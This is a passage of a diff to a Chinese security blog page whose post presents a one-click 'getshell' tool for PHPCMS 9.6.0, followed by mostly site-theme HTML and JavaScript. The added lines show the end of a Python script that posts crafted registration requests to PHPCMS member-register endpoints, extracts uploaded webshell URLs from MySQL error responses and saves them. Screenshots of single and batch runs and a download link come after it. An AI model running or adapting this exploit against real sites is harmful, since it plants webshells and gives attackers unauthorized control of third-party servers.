+            if crawlUrl:
+                rand_name = chars[Random().randint(0, len(chars) - 1)]
+                data[&quot;username&quot;] = &quot;akkuman_%s&quot; % rand_name
+                data[&quot;email&quot;] = &quot;akkuman_%s@qq.com&quot; % rand_name
+                host = urlparse(crawlUrl).scheme + &quot;://&quot; + urlparse(crawlUrl).hostname
+                url = host + &quot;/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1&quot;
+                htmlContent = requests.post(url, data=data, timeout=10)
+                successUrl = &quot;&quot;
+                if &quot;MySQL Error&quot; in htmlContent.text and &quot;http&quot; in htmlContent.text:
+                    successUrl = htmlContent.text[htmlContent.text.index(&quot;http&quot;):htmlContent.text.index(&quot;.php&quot;)] + &quot;.php&quot;
+                    print(&quot;[*]Shell  : %s&quot; % successUrl)
+                    saveShell(successUrl)
+                if successUrl == &quot;&quot;:
+                    print(&quot;[x]Failed : Failed to getshell.&quot;)
+            else:
+                continue
+        except:
+            print(&quot;Request Error&quot;)
+
+
+
+if __name__ == '__main__':
+    main()
+</code></pre>
+
+<h2>测试图</h2>
+
+<h3>单个</h3>
+
+<p><img src="data:image/gif;base64,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" data-src="https://ooo.0o0.ooo/2017/04/10/58eb6a69d5676.png" alt="TIM图片20170410191951.png" /></p>
+
+<h3>批量</h3>
+
+<p><img src="data:image/gif;base64,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" data-src="https://ooo.0o0.ooo/2017/04/11/58ec642d6578f.png" alt="TIM图片20170410225257.png" /></p>
+
+<h2>下载地址</h2>
+
+<p><a href="http://file.codecat.one/phpcms/">代码下载地址</a></p>
+
+                            </div>
+                            <div style="display:block;" class="clearfix">
+                                <section style="float:left;">
+                                    <span itemprop="keywords" class="tags">
+                                        tag(s): <a href="/tag/Tools/index.html">Tools </a>
+                                    </span>
+                                </section>
+                                <section style="float:right;">
+                                    <span><a id="btn-comments" href="javascript:isComments();">show comments</a></span> · <span><a href="javascript:goBack();">back</a></span> · 
+                                    <span><a href="/">home</a></span>
+                                </section>
+                            </div>
+                            
+
+
+
+<noscript>为正常使用Disqus评论功能请激活JavaScript</noscript>
+<div id="comments" class="gen">
+    <script>
         
-  <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
-    <div>！坚持技术分享，您的支持将鼓励我继续创作！</div>
-    <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
-      <span>赏</span>
-    </button>
-    <div id="QR" style="display: none;">
-      
-        <div id="wechat" style="display: inline-block">
-          <img id="wechat_qr" src="https://ooo.0o0.ooo/2017/03/03/58b9658d08406.png" alt="Akkuman WeChat Pay"/>
-          <p>微信打赏</p>
-        </div>
-      
-      
-        <div id="alipay" style="display: inline-block">
-          <img id="alipay_qr" src="https://ooo.0o0.ooo/2017/03/03/58b9657420977.jpg" alt="Akkuman Alipay"/>
-          <p>支付宝打赏</p>
-        </div>
-      
-    </div>
-  </div>
-
-
-      
-    </div>
-
-    <div>
-      
-        
-  <ul class="post-copyright">
-    <li class="post-copyright-author">
-      <strong>本文作者：</strong>
-      Akkuman
-    </li>
-    <li class="post-copyright-link">
-      <strong>本文链接：</strong>
-      <a href="http://hacktech.cn/2017/04/10/phpcms9-6-0-getshell-with-python.html" title="phpcms9-6-0 一键getshell工具">http://hacktech.cn/2017/04/10/phpcms9-6-0-getshell-with-python.html</a>
-    </li>
-    <li class="post-copyright-license">
-      <strong>版权声明： </strong>
-      本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
-    </li>
-  </ul>
-
-
-      
-    </div>
-
-    <footer class="post-footer">
-      
-        <div class="post-tags">
-          
-            <a href="/tags/Tools/" rel="tag"># Tools</a>
-          
-        </div>
-      
-
-      
-        
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-              <a href="/2017/04/02/mimipenguin.html" rel="next" title="抓取当前登录用户登录密码的工具：mimipenguin">
-                <i class="fa fa-chevron-left"></i> 抓取当前登录用户登录密码的工具：mimipenguin
-              </a>
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2017/04/11/BaiduSearch-get-realUrl-with-python.html" rel="prev" title="百度搜索引擎取真实地址-python代码">
-                百度搜索引擎取真实地址-python代码 <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
-      
-
-      
-      
-    </footer>
-  </article>
-
-
-
-    <div class="post-spread">
-      
-    </div>
-  </div>
-
-
-          </div>
-          
-
-
-          
-  <div class="comments" id="comments">
-    
-      <div id="lv-container" data-id="city" data-uid="MTAyMC8yNzk5OS80NTc2"></div>
-    
-  </div>
-
-
-        </div>
-        
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
-  </div>
-
-  <aside id="sidebar" class="sidebar">
-    <div class="sidebar-inner">
-
-      
-
-      
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview">
-            站点概览
-          </li>
-        </ul>
-      
-
-      <section class="site-overview sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-          <img class="site-author-image" itemprop="image"
-               src="/pic/avator.png"
-               alt="Akkuman" />
-          <p class="site-author-name" itemprop="name">Akkuman</p>
-           
-              <p class="site-description motion-element" itemprop="description">习技术,不积跬步无以至千里,不积小流无以成江海</p>
-          
-        </div>
-        <nav class="site-state motion-element">
-
-          
-            <div class="site-state-item site-state-posts">
-              <a href="/archives">
-                <span class="site-state-item-count">76</span>
-                <span class="site-state-item-name">日志</span>
-              </a>
-            </div>
-          
-
-          
-            
-            
-            <div class="site-state-item site-state-categories">
-              <a href="/categories/index.html">
-                <span class="site-state-item-count">18</span>
-                <span class="site-state-item-name">分类</span>
-              </a>
-            </div>
-          
-
-          
-            
-            
-            <div class="site-state-item site-state-tags">
-              <a href="/tags/index.html">
-                <span class="site-state-item-count">26</span>
-                <span class="site-state-item-name">标签</span>
-              </a>
-            </div>
-          
-
-        </nav>
-
-        
-          <div class="feed-link motion-element">
-            <a href="/atom.xml" rel="alternate">
-              <i class="fa fa-rss"></i>
-              RSS
-            </a>
-          </div>
-        
-
-        <div class="links-of-author motion-element">
-          
-            
-              <span class="links-of-author-item">
-                <a href="https://github.com/akkuman" target="_blank" title="GitHub">
-                  
-                    <i class="fa fa-fw fa-github"></i>
-                  
-                  GitHub
-                </a>
-              </span>
-            
-              <span class="links-of-author-item">
-                <a href="https://twitter.com/Akkum4n" target="_blank" title="Twitter">
-                  
-                    <i class="fa fa-fw fa-twitter"></i>
-                  
-                  Twitter
-                </a>
-              </span>
-            
-              <span class="links-of-author-item">
-                <a href="http://weibo.com/0xAkkuman" target="_blank" title="Weibo">
-                  
-                    <i class="fa fa-fw fa-weibo"></i>
-                  
-                  Weibo
-                </a>
-              </span>
-            
-              <span class="links-of-author-item">
-                <a href="http://t.me/akkuman" target="_blank" title="Telegram">
-                  
-                    <i class="fa fa-fw fa-globe"></i>
-                  
-                  Telegram
-                </a>
-              </span>
-            
-              <span class="links-of-author-item">
-                <a href="http://codecat.leanote.com/" target="_blank" title="Leanote">
-                  
-                    <i class="fa fa-fw fa-globe"></i>
-                  
-                  Leanote
-                </a>
-              </span>
-            
-              <span class="links-of-author-item">
-                <a href="http://www.jianshu.com/users/6b304cd12e87" target="_blank" title="简书">
-                  
-                    <i class="fa fa-fw fa-globe"></i>
-                  
-                  简书
-                </a>
-              </span>
-            
-          
-        </div>
-
-        
-        
-
-        
-        
-          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
-            <div class="links-of-blogroll-title">
-              <i class="fa  fa-fw fa-globe"></i>
-              Links
-            </div>
-            <ul class="links-of-blogroll-list">
-              
-                <li class="links-of-blogroll-item">
-                  <a href="http://www.x14hack.com/" title="MingKer" target="_blank">MingKer</a>
-                </li>
-              
-                <li class="links-of-blogroll-item">
-                  <a href="http://www.hongxuelin.com/" title="HongXuelin" target="_blank">HongXuelin</a>
-                </li>
-              
-                <li class="links-of-blogroll-item">
-                  <a href="http://al0n4k.com/" title="AL0N4K" target="_blank">AL0N4K</a>
-                </li>
-              
-                <li class="links-of-blogroll-item">
-                  <a href="http://www.storysec.com/" title="AnCoLin" target="_blank">AnCoLin</a>
-                </li>
-              
-                <li class="links-of-blogroll-item">
-                  <a href="http://www.lsafe.org/" title="ADminSS" target="_blank">ADminSS</a>
-                </li>
-              
-                <li class="links-of-blogroll-item">
-                  <a href="http://coco413.com/" title="Coco413" target="_blank">Coco413</a>
-                </li>
-              
-                <li class="links-of-blogroll-item">
-                  <a href="http://blog.ikey4u.me/" title="岁月's Blog" target="_blank">岁月's Blog</a>
-                </li>
-              
-                <li class="links-of-blogroll-item">
-                  <a href="http://www.wooyun.co/" title="Aikur" target="_blank">Aikur</a>
-                </li>
-              
-                <li class="links-of-blogroll-item">
-                  <a href="http://rcoil.me/" title="RcoIl" target="_blank">RcoIl</a>
-                </li>
-              
-                <li class="links-of-blogroll-item">
-                  <a href="http://www.loner.fm/" title="白帽子技术社区" target="_blank">白帽子技术社区</a>
-                </li>
-              
-                <li class="links-of-blogroll-item">
-                  <a href="http://lx.nextdev.top/" title="凌霄的博客" target="_blank">凌霄的博客</a>
-                </li>
-              
-                <li class="links-of-blogroll-item">
-                  <a href="http://hackteam.cn/" title="BlueBoy" target="_blank">BlueBoy</a>
-                </li>
-              
-                <li class="links-of-blogroll-item">
-                  <a href="http://perseus.codes/" title="EazyLov3" target="_blank">EazyLov3</a>
-                </li>
-              
-                <li class="links-of-blogroll-item">
-                  <a href="http://www.lucien116.com/" title="Lucien" target="_blank">Lucien</a>
-                </li>
-              
-                <li class="links-of-blogroll-item">
-                  <a href="http://lu4n.com/" title="Luan" target="_blank">Luan</a>
-                </li>
-              
-                <li class="links-of-blogroll-item">
-                  <a href="http://www.leavesongs.com/" title="phithon" target="_blank">phithon</a>
-                </li>
-              
-                <li class="links-of-blogroll-item">
-                  <a href="http://www.lz1y.cn/" title="lz1y" target="_blank">lz1y</a>
-                </li>
-              
-                <li class="links-of-blogroll-item">
-                  <a href="https://03k.org/" title="零散坑" target="_blank">零散坑</a>
-                </li>
-              
-            </ul>
-          </div>
-        
-
-        
-
-
-      </section>
-
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-              
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#介绍"><span class="nav-number">1.</span> <span class="nav-text">介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#待办"><span class="nav-number">2.</span> <span class="nav-text">待办</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#说明"><span class="nav-number">3.</span> <span class="nav-text">说明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#代码"><span class="nav-number">4.</span> <span class="nav-text">代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#批量"><span class="nav-number">5.</span> <span class="nav-text">批量</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#测试图"><span class="nav-number">6.</span> <span class="nav-text">测试图</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#单个"><span class="nav-number">6.1.</span> <span class="nav-text">单个</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#批量-1"><span class="nav-number">6.2.</span> <span class="nav-text">批量</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#下载地址"><span class="nav-number">7.</span> <span class="nav-text">下载地址</span></a></li></ol></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
-      
-
-      
-
-    </div>
-  </aside>
-
-
-        
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright" >
-  
-  &copy;  2016 - 
-  <span itemprop="copyrightYear">2018</span>
-  <span class="with-love">
-    <i class="fa fa-heart"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">Akkuman</span>
-  <!--以下3行为一条竖线和Coding Page-->
-  <div class="powered-by">  
-  </div>
-  <span>Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a></span>
+        document.write('<section id="disqus_thread"></section>');
+        var site_comment_load = function disqus() {
+            var d = document, s = d.createElement('script');
+            s.src = '//Akkum4n.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        }
+    </script>
 </div>
 
 
-<div class="powered-by">
-  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
-</div>
+                        </article>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <footer id="footer" role="contentinfo">
+    <div class="container-fluid">
+        <div class="row">
+        <div class="col-12">
+            &copy; 
+            <script type="text/javascript">
+                document.write(new Date().getFullYear());
+            </script>
+            <a href="/">Akkuman</a>.
+            Using <a target="_blank" href="http://www.chole.io/">Ink</a> & <a target="_blank" href="/">Story</a>.
+        </div>
+        </div>
+    </div>
+</footer>
 
-<div class="theme-info">
-  主题 -
-  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
-    NexT.Mist
-  </a>
-</div>
+<script src="https://cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="/bundle/js/prism.js"></script>
+<script src="/bundle/js/zoom-vanilla.min.js"></script>
+<script src="/bundle/js/main.js"></script>
 
+<script>
+    window.onload=function(){
+        var b = document.getElementsByClassName('b');
+        var w =  document.getElementsByClassName('w');
+        var menupgMargin = (b.length+w.length)*28;
+        var srhboxMargin = (b.length+w.length+3)*28;
+        var menusrhWidth = (b.length+w.length-1)*28;
+        document.getElementById('menu-page').style['margin-left'] = menupgMargin+'px';
+        document.getElementById('search-box').style['margin-left'] = srhboxMargin+'px';
+        document.getElementById('menu-search').style['width'] = menusrhWidth+'px';
+        if (window.location.hash!='') {
+          var i=window.location.hash.indexOf('#comment');
+          var ii=window.location.hash.indexOf('#respond-post');
+          if (i != '-1' || ii != '-1') {
+            document.getElementById('btn-comments').innerText='hide comments';
+            document.getElementById('comments').style.display='block';
+          }
+        }
+    }
 
-        
-<div class="busuanzi-count">
-  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    function isMenu(){
+        if(document.getElementById('menu-1').style.display=='inline'||document.getElementById('menu-1').style.display=='block'){
+            $('#search-box').fadeOut(200);
+            $('#menu-page').fadeOut(200);
+            $('#menu-1').fadeOut(500);
+            $('#menu-2').fadeOut(400);
+            $('#menu-3').fadeOut(300);
+        } else {
+            $('#menu-1').fadeIn(150);
+            $('#menu-2').fadeIn(150);
+            $('#menu-3').fadeIn(150);
+        }
+    }
 
-  
-    <span class="site-uv">
-      <i class="fa fa-user"></i>
-      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
-      
-    </span>
-  
+    function isMenu1(){
+        if(document.getElementById('menu-page').style.display=='block'){
+            $('#menu-page').fadeOut(300);
+        } else {
+            $('#menu-page').fadeIn(300);
+        }
+    }
 
-  
-    <span class="site-pv">
-      <i class="fa fa-eye"></i>
-      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
-      
-    </span>
-  
-</div>
+    function isMenu2(){
+        if(document.getElementById('torTree')){
+            if(document.getElementById('torTree').style.display=='block'){
+                $('#torTree').fadeOut(300);
+            } else {
+                $('#torTree').fadeIn(300);
+            }
+        }
+    }
 
+    function isMenu3(){
+        if($('#search-box').css('display')!='none'){
+            $('#search-box').fadeOut(300);
+        } else {
+            $('#search-box').fadeIn(300);
+        }
+    }
 
-        
-      </div>
-    </footer>
+    function isComments(){
+        if(document.getElementById('btn-comments').innerText=='show comments'){
+            document.getElementById('btn-comments').innerText='hide comments';
+            document.getElementById('comments').style.display='block';
+            site_comment_load();
+        } else {
+            document.getElementById('btn-comments').innerText='show comments';
+            document.getElementById('comments').style.display='none';
+        }
+    }
 
-    
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
-        
-      </div>
-    
+    function Search404(){
+        $('#menu-1').fadeIn(150);
+        $('#menu-2').fadeIn(150);
+        $('#menu-3').fadeIn(150);
+        $('#search-box').fadeIn(300);
+    }
 
-  </div>
-
-  
-
-<script type="text/javascript">
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
-  }
+    function goBack(){
+        window.history.back();
+    }
 </script>
 
 
-
-
-
-
-
-
-
-  
-
-
-
-
-
-
-  
-  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
-
-  
